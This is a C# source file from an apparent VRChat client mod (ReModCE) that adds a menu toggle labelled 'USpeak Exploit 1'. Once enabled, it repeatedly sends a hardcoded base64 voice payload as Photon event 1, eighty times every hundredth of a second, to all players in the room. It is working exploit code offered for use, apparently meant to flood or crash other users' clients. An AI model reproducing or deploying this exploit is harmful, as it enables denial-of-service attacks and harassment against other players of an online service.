using ReMod.Core;
using System;
using System.Collections;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ReModCE.PhotonExtension;
using ExitGames.Client.Photon;
using MelonLoader;
using Photon.Realtime;
using UnityEngine;
using VRC.SDKBase;
using ReMod.Core.UI.QuickMenu;
using ReMod.Core.Managers;
using ReModCE.Core;
using ReMod.Core.Unity;
using ReModCE.EvilEyeSDK;

namespace ReModCE.Exploits
{
	class Event1 : ModComponent
	{
		public bool _Event1Enabled;
		private static ReMenuToggle _Event1Toggled;
		public Event1()
		{
		}

		public override void OnUiManagerInit(UiManager uiManager)
		{
			var exploitsMenu = uiManager.MainMenu.GetCategoryPage("Exploits").GetCategory("USpeak");
			_Event1Toggled = exploitsMenu.AddToggle("USpeak Exploit 1", "Varation 1 of the USpeak Exploit", StartE1, _Event1Enabled);
		}

		public void StartE1(bool value)
		{
			_Event1Enabled = value;
			_Event1Toggled?.Toggle(value);

			if (_Event1Enabled)
			{
				MelonCoroutines.Start(PerformE1());
			}
        }

		private IEnumerator PerformE1()
		{
            while (_Event1Enabled)
            {
                byte[] VoiceData = Convert.FromBase64String(
                    "AAAAAAAAAAC7hjsA+H3owFygUv4w5B67lcSx14zff9FCPADiNbSwYWgE+O7Dhiy5tkRecs21ljjofvebe6xsYlA4cVmght0=");
                byte[] nulldata = new byte[4];
                byte[] ServerTime = BitConverter.GetBytes(Networking.GetServerTimeInMilliseconds());
                Buffer.BlockCopy(nulldata, 0, VoiceData, 0, 4);
                Buffer.BlockCopy(ServerTime, 0, VoiceData, 4, 4);
                int num;
                for (int i = 0; i < 80; i = num + 1)
                {
                    PhotonExtensions.OpRaiseEvent(1, VoiceData, new RaiseEventOptions
                    {
                        field_Public_ReceiverGroup_0 = 0,
                        field_Public_EventCaching_0 = 0
                    }, default(SendOptions));
                    num = i;
                }
                VoiceData = null;
                nulldata = null;
                ServerTime = null;
                yield return new WaitForSeconds(0.01f);
            }
        }
	}
}
